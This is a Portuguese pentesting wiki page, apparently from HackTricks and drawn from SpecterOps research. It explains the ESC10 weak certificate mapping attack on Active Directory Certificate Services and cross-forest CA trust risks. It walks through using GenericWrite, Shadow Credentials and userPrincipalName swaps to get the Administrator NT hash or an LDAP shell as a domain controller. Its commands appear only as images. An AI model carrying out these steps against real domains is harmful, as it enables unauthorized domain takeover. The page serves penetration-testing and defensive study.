<figure><img src="../../../.gitbook/assets/image (3) (1) (3).png" alt=""><figcaption></figcaption></figure>

## Mapeamentos de Certificado Fracos - ESC10

### Explicação

ESC10 refere-se a dois valores de chave de registro no controlador de domínio.

`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` `CertificateMappingMethods`. Valor padrão `0x18` (`0x8 | 0x10`), anteriormente `0x1F`.

`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` `StrongCertificateBindingEnforcement`. Valor padrão `1`, anteriormente `0`.

**Caso 1**

`StrongCertificateBindingEnforcement` definido como `0`

**Caso 2**

`CertificateMappingMethods` contém a flag `UPN` (`0x4`)

### Abuso Caso 1

* `StrongCertificateBindingEnforcement` definido como `0`
* `GenericWrite` em qualquer conta A para comprometer qualquer conta B

Neste caso, `John@corp.local` tem `GenericWrite` sobre `Jane@corp.local` e queremos comprometer `Administrator@corp.local`. As etapas de abuso são quase idênticas ao ESC9, exceto que qualquer modelo de certificado pode ser usado.

Primeiro, obtemos o hash de `Jane` usando, por exemplo, Shadow Credentials (usando nosso `GenericWrite`).

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (19).png" alt=""><figcaption></figcaption></figure>

Em seguida, alteramos o `userPrincipalName` de `Jane` para ser `Administrator`. Observe que estamos deixando de fora a parte `@corp.local`.

<figure><img src="../../../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>

Isso não viola as restrições, pois o `userPrincipalName` do usuário `Administrator` é `Administrator@corp.local` e não `Administrator`.

Agora, solicitamos qualquer certificado que permita autenticação do cliente, por exemplo, o modelo padrão `User`. Devemos solicitar o certificado como `Jane`.

<figure><img src="../../../.gitbook/assets/image (14) (2) (1).png" alt=""><figcaption></figcaption></figure>

Observe que o `userPrincipalName` no certificado é `Administrator`.

Em seguida, alteramos novamente o `userPrincipalName` de `Jane` para ser algo diferente, como seu `userPrincipalName` original `Jane@corp.local`.

<figure><img src="../../../.gitbook/assets/image (4) (1) (3).png" alt=""><figcaption></figcaption></figure>

Agora, se tentarmos autenticar com o certificado, receberemos o hash NT do usuário `Administrator@corp.local`. Você precisará adicionar `-domain <domínio>` à linha de comando, pois nenhum domínio é especificado no certificado.

<figure><img src="../../../.gitbook/assets/image (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

### Abuso Caso 2

* `CertificateMappingMethods` contém a flag `UPN` (`0x4`)
* `GenericWrite` em qualquer conta A para comprometer qualquer conta B sem uma propriedade `userPrincipalName` (contas de máquina e administrador de domínio incorporado `Administrator`)

Neste caso, `John@corp.local` tem `GenericWrite` sobre `Jane@corp.local` e queremos comprometer o controlador de domínio `DC$@corp.local`.

Primeiro, obtemos o hash de `Jane` usando, por exemplo, Shadow Credentials (usando nosso `GenericWrite`).

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10).png" alt=""><figcaption></figcaption></figure>

Em seguida, alteramos o `userPrincipalName` de `Jane` para ser `DC$@corp.local`.

<figure><img src="../../../.gitbook/assets/image (18) (2) (1).png" alt=""><figcaption></figcaption></figure>

Isso não viola as restrições, pois a conta de computador `DC$` não possui `userPrincipalName`.

Agora, solicitamos qualquer certificado que permita autenticação do cliente, por exemplo, o modelo padrão `User`. Devemos solicitar o certificado como `Jane`.

<figure><img src="../../../.gitbook/assets/image (20) (2).png" alt=""><figcaption></figcaption></figure>
Em seguida, alteramos o `userPrincipalName` de `Jane` para ser algo diferente, como seu `userPrincipalName` original (`Jane@corp.local`).

<figure><img src="../../../.gitbook/assets/image (9) (1) (3).png" alt=""><figcaption></figcaption></figure>

Agora, como essa chave de registro se aplica ao Schannel, devemos usar o certificado para autenticação via Schannel. É aqui que a nova opção `-ldap-shell` do Certipy entra em jogo.

Se tentarmos autenticar com o certificado e `-ldap-shell`, perceberemos que estamos autenticados como `u:CORP\DC$`. Esta é uma string enviada pelo servidor.

<figure><img src="../../../.gitbook/assets/image (21) (2) (1).png" alt=""><figcaption></figcaption></figure>

Um dos comandos disponíveis para o shell LDAP é `set_rbcd`, que definirá a Delegação Baseada em Recursos Restrita (RBCD) no alvo. Portanto, poderíamos realizar um ataque RBCD para comprometer o controlador de domínio.

<figure><img src="../../../.gitbook/assets/image (7) (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

Alternativamente, também podemos comprometer qualquer conta de usuário em que não haja `userPrincipalName` definido ou em que o `userPrincipalName` não corresponda ao `sAMAccountName` dessa conta. A partir dos meus próprios testes, o administrador de domínio padrão `Administrator@corp.local` não possui um `userPrincipalName` definido por padrão, e essa conta deve ter mais privilégios no LDAP do que os controladores de domínio.

## Comprometendo Florestas com Certificados

### Quebrando Confianças de CAs em Florestas de Confiança

A configuração para **inscrição entre florestas** é relativamente simples. Os administradores publicam o **certificado da CA raiz** da floresta de recursos **nas florestas de contas** e adicionam os certificados da **CA empresarial** da floresta de recursos aos contêineres **`NTAuthCertificates`** e AIA **em cada floresta de contas**. Para deixar claro, isso significa que a **CA** na floresta de recursos tem **controle completo** sobre todas as **outras florestas para as quais gerencia a PKI**. Se os atacantes **comprometerem essa CA**, eles podem **forjar certificados para todos os usuários nas florestas de recursos e de contas**, quebrando a fronteira de segurança da floresta.

### Princípios Estrangeiros com Privilégios de Inscrição

Outra coisa com a qual as organizações precisam ter cuidado em ambientes de várias florestas são as CAs empresariais **publicando modelos de certificados** que concedem **Usuários Autenticados ou princípios estrangeiros** (usuários/grupos externos à floresta à qual a CA empresarial pertence) **privilégios de inscrição e edição**.\
Quando uma conta **se autentica em uma confiança**, o AD adiciona o **SID de Usuários Autenticados** ao token do usuário autenticado. Portanto, se um domínio tiver uma CA empresarial com um modelo que **concede privilégios de inscrição a Usuários Autenticados**, um usuário em uma floresta diferente poderá **se inscrever no modelo**. Da mesma forma, se um modelo conceder explicitamente **privilégios de inscrição a um princípio estrangeiro**, então um **relacionamento de controle de acesso entre florestas é criado**, permitindo que um princípio em uma floresta **se inscreva em um modelo em outra floresta**.

Em última análise, esses dois cenários **aumentam a superfície de ataque** de uma floresta para outra. Dependendo das configurações do modelo de certificado, um atacante pode abusar disso para obter privilégios adicionais em um domínio estrangeiro.

## Referências

* Todas as informações desta página foram retiradas de [https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
